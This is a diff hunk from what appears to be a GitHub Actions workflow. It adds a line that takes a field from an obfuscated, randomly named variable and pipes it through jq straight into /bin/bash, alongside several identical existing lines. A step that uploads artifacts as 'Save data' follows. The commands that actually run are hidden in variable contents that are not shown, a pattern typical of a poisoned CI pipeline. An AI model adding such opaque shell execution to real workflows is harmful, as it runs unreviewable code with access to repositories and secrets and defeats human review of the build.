@@ -27,6 +27,7 @@ jobs:
           echo $ygq5004 | jq -r .czwuj9227 | /bin/bash
           echo $wcqrf34100 | jq -r .sjvh484 | /bin/bash
           echo $bcn623 | jq -r .tcpep06978 | /bin/bash
+          printf '%s' "$pt24113" | jq -r .r73818 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
